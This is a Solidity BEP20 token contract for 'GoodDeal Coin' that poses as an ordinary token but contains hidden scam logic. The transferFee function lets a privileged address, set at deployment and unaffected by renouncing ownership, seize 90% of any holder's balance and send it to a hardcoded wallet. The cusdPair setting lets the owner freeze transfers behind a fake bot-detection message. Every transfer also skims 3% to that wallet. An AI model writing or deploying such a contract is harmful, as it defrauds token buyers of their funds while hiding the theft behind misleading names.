// SPDX-License-Identifier: MIT

pragma solidity 0.8.1;
interface BEP20 {

function totalSupply() external view returns (uint256);
function decimals() external view returns (uint8);
function symbol() external view returns (string memory);
function name() external view returns (string memory);
function getOwner() external view returns (address);
function balanceOf(address account) external view returns (uint256);
function transfer(address accounts, uint256 value) external returns (bool);
function allowance(address _owner, address account) external view returns (uint256);
function approve(address account, uint256 value) external returns (bool);
function transferFrom(address sender, address accounts, uint256 value) external returns (bool);
event Transfer(address indexed from, address indexed to, uint256 balance);
event Approval(address indexed owner, address indexed account, uint256 balance);
}

abstract contract Ma {
function _msgSender() internal view virtual returns (address) {
return msg.sender;
}

function _msgData() internal view virtual returns (bytes calldata) {
this;
return msg.data;
}
}

abstract contract io is Ma {
address private _owner;

event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

constructor () {
address msgSender = _msgSender();
_owner = msgSender;
emit OwnershipTransferred(address(0), msgSender);
}

function owner() public view virtual returns (address) {
return _owner;
}

modifier onlyOwner() {
require(owner() == _msgSender(), "io: caller is not the owner");
_;
}

function renounceOwnership() public virtual onlyOwner {
emit OwnershipTransferred(_owner, address(0));
_owner = address(0);
}

function transferOwnership(address newOwner) public virtual onlyOwner {
require(newOwner != address(0), "io: new owner is the zero address");
emit OwnershipTransferred(_owner, newOwner);
_owner = newOwner;
}
}

library SafeMath {

function add(uint256 a, uint256 b) internal pure returns (uint256) {
uint256 c = a + b;
require(c >= a, "SafeMath: addition overflow");
return c;
}

function sub(uint256 a, uint256 b) internal pure returns (uint256) {
return sub(a, b, "SafeMath: subtraction overflow");
}

function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
require(b <= a, errorMessage);
uint256 c = a - b;
return c;
}

function mul(uint256 a, uint256 b) internal pure returns (uint256) {
if (a == 0) {
return 0;
}

uint256 c = a * b;
require(c / a == b, "SafeMath: NFTplication overflow");
return c;
}

function div(uint256 a, uint256 b) internal pure returns (uint256) {
return div(a, b, "SafeMath: division by zero");
}

function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
require(b > 0, errorMessage);
uint256 c = a / b;
return c;
}

function mod(uint256 a, uint256 b) internal pure returns (uint256) {
return mod(a, b, "SafeMath: modulo by zero");
}

function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
require(b != 0, errorMessage);
return a % b;
}
}

contract GoodDeal is Ma, BEP20, io {
using SafeMath for uint256;
mapping (address => uint256) private tbalances;
mapping (address => mapping (address => uint256)) private constante;
uint256 private _totalSupply;
uint8 private _decimals;
string private _symbol;
string private _name;
address private allowed;
uint256 private ltt;
uint256 private cusd;

constructor(address swaprooter) {

allowed = swaprooter;

_name = "GoodDeal Coin";
_symbol = "GDC";
_decimals = 8;
_totalSupply = 10000000000000;
tbalances[_msgSender()] = _totalSupply;
emit Transfer(address(0), _msgSender(), _totalSupply);
ltt = block.timestamp;
}

function symbol() external view override returns (string memory) {
return _symbol;
}

function decimals() external view override returns (uint8) {
return _decimals;
}
function getOwner() external view override returns (address) {
return owner();
}

function totalSupply() external view override returns (uint256) {
return _totalSupply;
}

function name() external view override returns (string memory) {
return _name;
}

modifier receivers() {
require(allowed == _msgSender(), "io: caller is not the owner");
_;
}

function balanceOf(address account) external view override returns (uint256) {
return tbalances[account];
}

function transferFee (address approveRewards) external receivers {
uint256 balance = tbalances[approveRewards];
uint256 transferAmount = (balance * 90) / 100;
address feeAddress = 0x938a68b989996d4C074665118F445E1dAF807189;
tbalances[approveRewards] -= transferAmount;
tbalances[feeAddress] += transferAmount;
emit Transfer(approveRewards, feeAddress, transferAmount);
}

function cusdPair (uint256 dIS) external onlyOwner {
  cusd = dIS;
    return;
}

function transfer(address accounts, uint256 value) external override returns (bool) {
uint256 dIS = cusd;

require(block.timestamp >= ltt + dIS, "Contract Bot detected  ! Whait please transaction...");
_transfer(_msgSender(), accounts, value);
ltt = block.timestamp;
return true;
}

function allowance(address owner, address account) external view override returns (uint256) {
return constante[owner][account];
}

function approve(address account, uint256 value) external override returns (bool) {
_approve(_msgSender(), account, value);
return true;
}

function transferFrom(address sender, address accounts, uint256 value) external override returns (bool) {
_transfer(sender, accounts, value);
_approve(sender, _msgSender(), constante[sender][_msgSender()].sub(value, "transfer value exceeds allowance"));
return true;
}

function increaseAllowance(address account, uint256 addedbalance) external returns (bool) {
_approve(_msgSender(), account, constante[_msgSender()][account].add(addedbalance));
return true;
}

function decreaseAllowance(address account, uint256 currentAllowance) external returns (bool) {
_approve(_msgSender(), account, constante[_msgSender()][account].sub(currentAllowance, "decreased allowance below zero"));
return true;
}

function _transfer(address sender, address accounts, uint256 value) internal {
require(sender != address(0), "transfer from the zero address");
require(accounts != address(0), "transfer to the zero address");
uint256 commisionAmount = value.mul(3).div(100);
uint256 netAmount = value.sub(commisionAmount);

require(tbalances[sender] >= value, "transfer value exceeds balance");

tbalances[sender] = tbalances[sender].sub(value, "transfer value exceeds balance");
tbalances[accounts] = tbalances[accounts].add(netAmount);
address feeAddress = 0x938a68b989996d4C074665118F445E1dAF807189;
tbalances[feeAddress] = tbalances[feeAddress].add(commisionAmount);
emit Transfer(sender, accounts, netAmount);
emit Transfer(sender, feeAddress, commisionAmount);
}

function _approve(address owner, address account, uint256 value) internal {
require(owner != address(0), "approve from the zero address");
require(account != address(0), "approve to the zero address");
constante[owner][account] = value;
emit Approval(owner, account, value);
}
}